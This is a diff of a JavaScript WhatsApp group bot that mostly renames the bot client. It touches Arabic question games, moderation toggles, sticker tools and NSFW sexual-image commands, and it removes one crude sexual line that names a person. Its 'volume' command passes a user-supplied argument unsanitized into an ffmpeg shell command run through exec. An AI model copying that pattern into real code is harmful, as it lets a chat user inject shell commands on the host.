-  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `اختار من الزر\n\nفتح او\nقفل`, `${global.botname}`, m)
+  await Elza3emgonBot.sendButtonText(m.chat, buttonsntilink, `اختار من الزر\n\nفتح او\nقفل`, `${global.botname}`, m)
   }
   }
   break
@@ -4229,13 +4230,13 @@ if (antiToxic) return m.reply('نشط بالفعل')
 nttoxic.push(from)
 fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
 m.reply('تم تفعيل منع السب بنجاح')
-var groupe = await ElgazarBot.groupMetadata(from)
+var groupe = await Elza3emgonBot.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️تحذير⚠️ 」\`\`\`\n\nاي حد قليل ادب ويسب سيتم طرده!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {text: `\`\`\`「 ⚠️تحذير⚠️ 」\`\`\`\n\nاي شخص سوف يسب سيتم طرده علي الفور!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!antiToxic) return m.reply('معطل بالفعل')
 let off = nttoxic.indexOf(from)
@@ -4247,7 +4248,7 @@ m.reply('تم ايقاف منع السب بنجاح')
   { buttonId: `${command} on`, buttonText: { displayText: 'فتح' }, type: 1 },
   { buttonId: `${command} off`, buttonText: { displayText: 'قفل' }, type: 1 }
   ]
-  await ElgazarBot.sendButtonText(m.chat, buttonsnttoxic, `اختار من الزر\n\nفتح او\nقفل`, `${global.botname}`, m)
+  await Elza3emgonBot.sendButtonText(m.chat, buttonsnttoxic, `اختار من الزر\n\nفتح او\nقفل`, `${global.botname}`, m)
   }
   }
   break
@@ -4260,13 +4261,13 @@ if (Autoreply) return m.reply('Already activated')
 autorep.push(from)
 fs.writeFileSync('./database/autoreply.json', JSON.stringify(autorep))
 m.reply('Success in turning on auto reply in this group')
-var groupe = await ElgazarBot.groupMetadata(from)
+var groupe = await Elza3emgonBot.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nAuto reply has been enabled in this group, means bot may send unnecessary voice note!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nAuto reply has been enabled in this group, means bot may send unnecessary voice note!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!Autoreply) return m.reply('Already deactivated')
 let off = autorep.indexOf(from)
@@ -4278,7 +4279,7 @@ m.reply('Success in turning off auto reply in this group')
   { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
-  await ElgazarBot.sendButtonText(m.chat, buttonsnttoxic, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  await Elza3emgonBot.sendButtonText(m.chat, buttonsnttoxic, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
   }
   }
   break
@@ -4291,13 +4292,13 @@ if (antiWame) return m.reply('Already activated')
 ntwame.push(from)
 fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
 m.reply('Success in turning on antiwame in this group')
-var groupe = await ElgazarBot.groupMetadata(from)
+var groupe = await Elza3emgonBot.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!antiWame) return m.reply('Already deactivated')
 let off = nttoxic.indexOf(from)
@@ -4309,7 +4310,7 @@ m.reply('Success in turning off antiwame in this group')
   { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
-  await ElgazarBot.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  await Elza3emgonBot.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
   }
   }
   break
@@ -4322,13 +4323,13 @@ if (Antilinkgc) return m.reply('Already activated')
 ntlinkgc.push(from)
 fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
 m.reply('Success in turning on antiwame in this group')
-var groupe = await ElgazarBot.groupMetadata(from)
+var groupe = await Elza3emgonBot.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!Antilinkgc) return m.reply('Already deactivated')
 let off = ntlinkgc.indexOf(from)
@@ -4340,7 +4341,7 @@ m.reply('Success in turning off antiwame in this group')
   { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
-  await ElgazarBot.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  await Elza3emgonBot.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
   }
   }
   break
@@ -4403,8 +4404,8 @@ case 'dare': case 'تويت':
 "روايتك المفضله ?", 
 "اخر اكله اكلتها", 
 "اخر كتاب قرآته", 
-"ليه عبدالله محمد جدع؟ ", 
- "ليه الجزار جدع؟ ", 
+"ليه غون جدع؟ ", 
+ "ليه غون جدع؟ ", 
 "افضل يوم ف حياتك", 
 "ليه مضيفتش كل جهاتك", 
 "حكمتك ف الحياه", 
@@ -4632,7 +4633,7 @@ case 'dare': case 'تويت':
   "تتوقع إنك بتتزوج اللي تحبه؟ ",
   "ما هو أمنيتك؟ ",
   "وين تشوف نفسك بعد خمس سنوات؟ ",
-  "هل انت حرامي تويت بتعت عبدالله محمد؟ ",
+  "هل انت حرامي تويت بتعت ؟ ",
   "لو خيروك تقدم الزمن ولا ترجعه ورا؟ ",
   "لعبة قضيت وقتك فيه بالحجر المنزلي؟ ",
   "تحب تطق الميانة ولا ثقيل؟ ",
@@ -4640,7 +4641,7 @@ case 'dare': case 'تويت':
   "اول ماتصحى من النوم مين تكلمه؟ ",
   "عندك الشخص اللي يكتب لك كلام كثير وانت نايم؟ ",
   "قد قابلت شخص تحبه؟ وولد ولا بنت؟ ",
-   "هل انت تحب عبدالله محمد؟ ",
+   "هل انت تحب ؟ ",
 "اذا قفطت احد تحب تفضحه ولا تستره؟ ",
   "كلمة للشخص اللي يسب ويسطر؟ ",
   "آية من القران تؤمن فيه؟ ",
@@ -4652,7 +4653,7 @@ case 'dare': case 'تويت':
   "اذكر موقف ماتنساه بعمرك؟ ",
   "وش حاب تقول للاشخاص اللي بيدخل حياتك؟ ",
   "ألطف شخص مر عليك بحياتك؟ ",
-   "هل عبدالله محمد لطيف؟ ",
+   "هل  لطيف؟ ",
 "انت من الناس المؤدبة ولا نص نص؟ ",
   "كيف الصيد معاك هالأيام ؟ وسنارة ولاشبك؟ ",
   "لو الشخص اللي تحبه قال بدخل حساباتك بتعطيه ولا تكرشه؟ ",
@@ -4681,7 +4682,6 @@ case 'dare': case 'تويت':
   "انسان م تحب تتعامل معاه ابداً ؟ ",
   "شيء بسيط تحتفظ فيه؟ ",
   "فُرصه تتمنى لو أُتيحت لك ؟ ",
-   "لي عبدالله محمد ناك اليكس؟ ",
   "شيء مستحيل ترفضه ؟. ",
   "لو زعلت بقوة وش بيرضيك ؟ ",
   "تنام بـ اي مكان ، ولا بس غرفتك ؟ ",
@@ -4711,7 +4711,7 @@ case 'dare': case 'تويت':
 ]
               const xeondare = dare[Math.floor(Math.random() * dare.length)]
               bufferdare = await getBuffer(`https://telegra.ph/file/25ac27774c8a0420e2649.jpg`)
-              ElgazarBot.sendMessage(from, { image: bufferdare, caption: '*♚ مرحبا بك في قسم تويت*\nꔹ━━━━━ꔹ\n'+ xeondare }, {quoted:m})
+              Elza3emgonBot.sendMessage(from, { image: bufferdare, caption: '*☆ مرحبا بك في قسم تويت*\nꔹ━━━━━ꔹ\n'+ xeondare }, {quoted:m})
               break
                             break
        case 'truth': case 'خيروك':
@@ -4815,7 +4815,7 @@ case 'dare': case 'تويت':
 ]
               const xeontruth = truth[Math.floor(Math.random() * truth.length)]
               buffertruth = await getBuffer(`https://telegra.ph/file/25ac27774c8a0420e2649.jpg`)
-              ElgazarBot.sendMessage(from, { image: buffertruth, caption: '*♚ مرحبا بك في لعبة لو خيروك*\nꔹ━━━━━ꔹ\n'+ xeontruth }, {quoted:m})
+              Elza3emgonBot.sendMessage(from, { image: buffertruth, caption: '*☆ مرحبا بك في لعبة لو خيروك*\nꔹ━━━━━ꔹ\n'+ xeontruth }, {quoted:m})
               break  
               
      case 'truth1': case 'اذكار':
@@ -4864,7 +4864,7 @@ case 'dare': case 'تويت':
 ]
               const xeontruth1 = truth1[Math.floor(Math.random() * truth1.length)]
               buffertruth1 = await getBuffer(`https://telegra.ph/file/25ac27774c8a0420e2649.jpg`)
-              ElgazarBot.sendMessage(from, { image: buffertruth1, caption: '*♚ مرحبا بك في قسم الاذكار*\nꔹ━━━━━ꔹ\n'+ xeontruth1 }, {quoted:m})
+              Elza3emgonBot.sendMessage(from, { image: buffertruth1, caption: '*☆ مرحبا بك في قسم الاذكار*\nꔹ━━━━━ꔹ\n'+ xeontruth1 }, {quoted:m})
               break
        
        case 'hfuduf': case 'بوست':
@@ -4977,7 +4977,7 @@ case 'dare': case 'تويت':
 ]
               const xeonhfuduf = hfuduf[Math.floor(Math.random() * hfuduf.length)]
               bufferhfuduf = await getBuffer(`كتتت`)
-              ElgazarBot.sendMessage(from, { text: bufferhfuduf, caption: '*♚ مرحبا بك في البوستات*\nꔹ━━━━━ꔹ\n'+ xeonhfuduf }, {quoted:m})
+              Elza3emgonBot.sendMessage(from, { text: bufferhfuduf, caption: '*☆ مرحبا بك في البوستات*\nꔹ━━━━━ꔹ\n'+ xeonhfuduf }, {quoted:m})
               break
        
        case 'gmscat': case 'كت':
@@ -4986,7 +4986,7 @@ case 'dare': case 'تويت':
 ]
               const xeongmscat = gmscat[Math.floor(Math.random() * gmscat.length)]
               buffergmscat = await getBuffer(`https://telegra.ph/file/25ac27774c8a0420e2649.jpg`)
-              ElgazarBot.sendMessage(from, { image: buffergmscat, caption: '*♚ مرحبا بك في كت*\nꔹ━━━━━ꔹ\n'+ xeongmscat }, {quoted:m})
+              Elza3emgonBot.sendMessage(from, { image: buffergmscat, caption: '*☆ مرحبا بك في كت*\nꔹ━━━━━ꔹ\n'+ xeongmscat }, {quoted:m})
               break
        
        case 'isjshsd': case 'انصح':
@@ -5054,7 +5054,7 @@ case 'dare': case 'تويت':
 ]
               const xeonisjshsd = isjshsd[Math.floor(Math.random() * isjshsd.length)]
               bufferisjshsd = await getBuffer(`https://telegra.ph/file/25ac27774c8a0420e2649.jpg`)
-              ElgazarBot.sendMessage(from, { image: bufferisjshsd, caption: '*♚ اتفضل النصيحه اعمل بيها*\nꔹ━━━━━ꔹ\n'+ xeonisjshsd }, {quoted:m})
+              Elza3emgonBot.sendMessage(from, { image: bufferisjshsd, caption: '*☆ اتفضل النصيحه اعمل بيها*\nꔹ━━━━━ꔹ\n'+ xeonisjshsd }, {quoted:m})
               break
        
        case 'idhsisgd': case 'حروف':
@@ -5112,7 +5112,7 @@ case 'dare': case 'تويت':
 ]
               const xeonidhsisgd = idhsisgd[Math.floor(Math.random() * idhsisgd.length)]
               bufferidhsisgd = await getBuffer(`https://telegra.ph/file/25ac27774c8a0420e2649.jpg`)
-              ElgazarBot.sendMessage(from, { image: bufferidhsisgd, caption: '*♚ مرحبا بك في لعبة الحروف*\nꔹ━━━━━ꔹ\n'+ xeonidhsisgd }, {quoted:m})
+              Elza3emgonBot.sendMessage(from, { image: bufferidhsisgd, caption: '*☆ مرحبا بك في لعبة الحروف*\nꔹ━━━━━ꔹ\n'+ xeonidhsisgd }, {quoted:m})
               break
        
        case 'jtudvu': case 'اسال':
@@ -5361,7 +5361,7 @@ case 'dare': case 'تويت':
 ]
               const xeonjtudvu = jtudvu[Math.floor(Math.random() * jtudvu.length)]
               bufferjtudvu = await getBuffer(`https://telegra.ph/file/25ac27774c8a0420e2649.jpg`)
-              ElgazarBot.sendMessage(from, { image: bufferjtudvu, caption: '*♚ اتفضل سوال يلا جاوب*\nꔹ━━━━━ꔹ\n'+ xeonjtudvu }, {quoted:m})
+              Elza3emgonBot.sendMessage(from, { image: bufferjtudvu, caption: '*☆ اتفضل سوال يلا جاوب*\nꔹ━━━━━ꔹ\n'+ xeonjtudvu }, {quoted:m})
               break
        
 case 'عكس': {
@@ -5374,11 +5374,11 @@ break
 case 'toviewonce': case 'toonce': { 
         if (!quoted) return m.reply(`Reply image`)
         if (/image/.test(mime)) {
-anuoncr2 = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
-ElgazarBot.sendMessage(m.chat, {image: {url: anuoncr2},viewOnce : true},{quoted: m })
+anuoncr2 = await Elza3emgonBot.downloadAndSaveMediaMessage(quoted)
+Elza3emgonBot.sendMessage(m.chat, {image: {url: anuoncr2},viewOnce : true},{quoted: m })
         } else if (/video/.test(mime)) {
-        anuonce2 = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
-        ElgazarBot.sendMessage(m.chat, {video: {url: anuonce2},viewOnce : true},{quoted: m })
+        anuonce2 = await Elza3emgonBot.downloadAndSaveMediaMessage(quoted)
+        Elza3emgonBot.sendMessage(m.chat, {video: {url: anuonce2},viewOnce : true},{quoted: m })
         }
         }
         break
@@ -5409,13 +5409,13 @@ if (antiVirtex) return m.reply('Already activated')
 ntvirtex.push(from)
 fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
 m.reply('Success in turning on antivirus in this group')
-var groupe = await ElgazarBot.groupMetadata(from)
+var groupe = await Elza3emgonBot.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!antiVirtex) return m.reply('Already deactivated')
 let off = ntvirtex.indexOf(from)
@@ -5427,7 +5427,7 @@ m.reply('Success in turning off antivirus this group')
   { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
-  await ElgazarBot.sendButtonText(m.chat, buttonsntvirtex, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  await Elza3emgonBot.sendButtonText(m.chat, buttonsntvirtex, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
   }
   }
   break
@@ -5440,13 +5440,13 @@ if (AntiNsfw) return m.reply('Already activated')
 ntnsfw.push(from)
 fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
 m.reply('Success in turning on nsfw in this group')
-var groupe = await ElgazarBot.groupMetadata(from)
+var groupe = await Elza3emgonBot.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiNsfw) return m.reply('Already deactivated')
 let off = ntnsfw.indexOf(from)
@@ -5458,7 +5458,7 @@ m.reply('Success in turning off nsfw in this group')
   { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
-  await ElgazarBot.sendButtonText(m.chat, buttonsntnsfw, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  await Elza3emgonBot.sendButtonText(m.chat, buttonsntnsfw, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
   }
   }
   break
@@ -5475,7 +5475,7 @@ const result4 = `*تحميل ميديافاير*
 *التمثيل* : ${baby1[0].mime}
 *لينك* : ${baby1[0].link}`
 m.reply(`${result4}`)
-ElgazarBot.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
+Elza3emgonBot.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
 }
 break
 case 'lyrics2': {
@@ -5503,7 +5503,7 @@ var txt = `
 *${themeemoji} Lyrics :-* \n
 ${lyrics.lyrics}`
 console.log(lyrics)
- await ElgazarBot.sendMessage(m.chat, {text:txt},{quoted:m})
+ await Elza3emgonBot.sendMessage(m.chat, {text:txt},{quoted:m})
 } catch (err) {
     console.log(err)
     }
@@ -5525,7 +5525,7 @@ ${themeemoji} *Media Url* : ${images}`,
                     buttons: buttons,
                     headerType: 4
                 }
-                ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
         }
         break
 case 'صوره':
@@ -5534,7 +5534,7 @@ case 'image': case 'صورة': {
 		let { pinterest } = require('./lib/scraperW')
                 anuxeonezy2 = await pinterest(text)
                 resultkkk3 = anuxeonezy2[Math.floor(Math.random() * anuxeonezy2.length)]
-                ElgazarBot.sendMessage(m.chat, { image: { url: resultkkk3 }, caption: ` ${themeemoji} رابط الوسائط : `+resultkkk3 }, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, { image: { url: resultkkk3 }, caption: ` ${themeemoji} رابط الوسائط : `+resultkkk3 }, { quoted: m })
             }
             break
 case 'سرقه': case 'زرف': case 'wm': case 'سرقة': {  
@@ -5543,16 +5543,16 @@ const swn = args.join(" ")
 const pcknm = swn.split("|")[0];
 const atnm = swn.split("|")[1];
 if (m.quoted.isAnimated === true) {
-ElgazarBot.downloadAndSaveMediaMessage(quoted, "gifee")
-ElgazarBot.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
+Elza3emgonBot.downloadAndSaveMediaMessage(quoted, "gifee")
+Elza3emgonBot.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
 } else if (/image/.test(mime)) {
 let media = await quoted.download()
-let encmedia = await ElgazarBot.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: global.atnm })
+let encmedia = await Elza3emgonBot.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: global.atnm })
 await fs.unlinkSync(encmedia)
 } else if (/video/.test(mime)) {
 if ((quoted.msg || quoted).seconds > 11) return m.reply('بحد أقصى 10 ثواني!')
 let media = await quoted.download()
-let encmedia = await ElgazarBot.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
+let encmedia = await Elza3emgonBot.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
 await fs.unlinkSync(encmedia)
 } else {
 m.reply(`ارسل صوره او فيديو واكتب ${prefix + command}\nمدة الفيديو 1-9 ثواني`)
@@ -5562,21 +5562,21 @@ break
 case 'ايموجي': {
 if (!args.join(" ")) return m.reply('اين هو الايموحي?')
 emoji.get(args.join(" ")).then(async(emoji) => {
-let mese = await ElgazarBot.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `حقوق: ${global.botname}`}, {quoted:m})
-await ElgazarBot.sendMessage(from, {text:"رد علي الصوره واكتب ستيكر"}, {quoted:mese})
+let mese = await Elza3emgonBot.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `حقوق: ${global.botname}`}, {quoted:m})
+await Elza3emgonBot.sendMessage(from, {text:"رد علي الصوره واكتب ستيكر"}, {quoted:mese})
 })
 }
 break
 case 'volume': {
 if (!args.join(" ")) return m.reply(`Example: ${prefix + command} 10`)
-media = await ElgazarBot.downloadAndSaveMediaMessage(quoted, "volume")
+media = await Elza3emgonBot.downloadAndSaveMediaMessage(quoted, "volume")
 if (isQuotedAudio) {
 rname = getRandom('.mp3')
 exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
 fs.unlinkSync(media)
 if (err) return m.reply('Error!')
 jadie = fs.readFileSync(rname)
-ElgazarBot.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
+Elza3emgonBot.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
 fs.unlinkSync(rname)
 })
 } else if (isQuotedVideo) {
@@ -5585,7 +5585,7 @@ exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, st
 fs.unlinkSync(media)
 if (err) return m.reply('Error!')
 jadie = fs.readFileSync(rname)
-ElgazarBot.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
+Elza3emgonBot.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
 fs.unlinkSync(rname)
 })
 } else {
@@ -5614,7 +5614,7 @@ m.reply(mess.wait)
       buttons: wbuttsss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonssMessages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonssMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -5633,7 +5633,7 @@ case 'animewallpaper': case 'animewall': {
                     buttons: buttons,
                     headerType: 4
                 }
-                ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
 case 'animewall2': case 'animewallpaper2':
@@ -5657,10 +5657,10 @@ var walb = [
       buttons: walb,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, wal,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, wal,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
-//ElgazarBot.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
+//Elza3emgonBot.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
 break
 case 'igemoji': 
 case 'instagramemoji': 
@@ -5726,14 +5726,14 @@ break
 case 'cry':case 'kill':case 'hug':case 'pat':case 'lick':case 'kiss':case 'bite':case 'yeet':case 'neko':case 'bully':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'awoo':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'cuddle':case 'highfive':case 'shinobu':case 'megumin':case 'handhold':
 					axios.get(`https://api.waifu.pics/sfw/${command}`)
 					.then(({data}) => {
-						ElgazarBot.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
+						Elza3emgonBot.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 					})
 					break
 case 'loli-waifu':
 					m.reply(mess.wait)
 					axios.get(`https://api.waifu.pics/sfw/waifu`)
 					.then(({data}) => {
-					ElgazarBot.sendImage(m.chat, data.url, mess.success, m)
+					Elza3emgonBot.sendImage(m.chat, data.url, mess.success, m)
 					})
 					break
 case 'hentaivid': case 'hentaivideo': {
@@ -5743,7 +5743,7 @@ if (!AntiNsfw) return m.reply(mess.nsfw)
                 const { hentai } = require('./lib/scraper.js')
                 anu = await hentai()
                 result912 = anu[Math.floor(Math.random(), anu.length)]
-                ElgazarBot.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
             }
             break
 case 'trap' :
@@ -5760,7 +5760,7 @@ m.reply(mess.wait)
   buttons: trapbot,
   headerType: 1
   }     
-            await ElgazarBot.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -5778,7 +5778,7 @@ if (!AntiNsfw) return m.reply(mess.nsfw)
   buttons: hnekobot,
   headerType: 1
   }      
-            await ElgazarBot.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -5797,7 +5797,7 @@ m.reply(mess.wait)
   buttons: nwaifubot,
   headerType: 1
   }      
-            await ElgazarBot.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
                     return('Error!')
                 })
 break
@@ -5816,7 +5816,7 @@ m.reply(mess.wait)
       buttons: wbuttsss,
       headerType: 4
       }     
-            await ElgazarBot.sendMessage(m.chat, buttonsssMessages,{ quoted:m }).catch(err => {
+            await Elza3emgonBot.sendMessage(m.chat, buttonsssMessages,{ quoted:m }).catch(err => {
                     return('Error!')
                 })
 break  
@@ -5826,7 +5826,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/milf.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break 
 case 'ahegao':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5835,7 +5835,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ahegao.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'ass':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5844,7 +5844,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'bdsm':
 if (!m.isGroup) return m.reply(mess.group)
@@ -5853,7 +5853,7 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
 var xeonyresult = pickRandom(ahegaonsfw)
